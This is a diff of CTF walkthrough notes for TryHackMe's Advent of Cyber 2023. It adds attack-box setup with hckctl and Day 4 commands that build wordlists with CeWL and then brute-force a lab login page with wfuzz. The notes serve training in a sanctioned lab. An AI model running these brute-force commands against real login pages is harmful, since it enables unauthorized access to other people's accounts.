@@ -1,8 +1,11 @@
 # Advent of Cyber 2023
 
+* TryHackMe [room](https://tryhackme.com/room/adventofcyber2023)
+
 ## Setup
 
 * [Access via OpenVPN](https://tryhackme.com/access)
+* [hckops/hckctl](https://github.com/hckops/hckctl)
 
 ```bash
 hckctl config
@@ -16,10 +19,18 @@ network:
 
 Starts a local AttackBox
 ```bash
+# parrot
 hckctl box parrot-sec --network-vpn thm
 
-# parrot
+# kali
+hckctl box kali --network-vpn thm
+
+# vnc
 vncviewer localhost:5900
+# (mac|linux) novnc
+[open|xdg-open] http://localhost:6080
+# (mac|linux) tty
+[open|xdg-open] http://localhost:7681
 ```
 
 ## Day 1
@@ -148,7 +159,7 @@ vncviewer localhost:5900
     - dividing by 3600 (1 hour = 3600 seconds): 14776/3600 = 4.1 hours
     - in average 2.05 hours
 
-Suggested tools
+Tools
 * [crunch](https://www.kali.org/tools/crunch)
 * [thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
 
@@ -181,4 +192,38 @@ hckctl task legba \
 
 ## Day 4
 
-> TODO
+> Baby, it's CeWLd outside (Brute-forcing)
+
+Tools
+* [CeWL](https://github.com/digininja/CeWL)
+* [Wfuzz](https://github.com/xmendez/wfuzz)
+
+Alternative tools
+* [ffuf](https://github.com/ffuf/ffuf)
+
+```bash
+# install in the box
+hckctl box kali --network-vpn thm
+apt-get install -y cewl
+
+# default task
+hckctl task cewl --network-vpn thm --input address=<MACHINE_IP>
+# count lines
+cat $(hckctl config | yq '.common.shareDir')/output.txt | wc -l
+
+# generate wordlists
+# -d spidering depth
+# -m minimum and -x maximum word length
+hckctl task cewl --network-vpn thm --inline -- \
+  /usr/src/CeWL/cewl.rb -v -d 2 -m 5 -w /hck/share/cewl-passwords.txt http://<MACHINE_IP> --with-numbers
+hckctl task cewl --network-vpn thm --inline -- \
+  /usr/src/CeWL/cewl.rb -v -d 0 -m 5 -w /hck/share/cewl-usernames.txt http://<MACHINE_IP>/team.php --lowercase
+
+# brute force login
+hckctl task wfuzz --network-vpn thm --inline -- wfuzz -c \
+  -z file,/hck/share/cewl-usernames.txt \
+  -z file,/hck/share/cewl-passwords.txt \
+  --hs "Please enter the correct credentials" \
+  -u http://<MACHINE_IP>/login.php \
+  -d "username=FUZZ&password=FUZ2Z"
+```
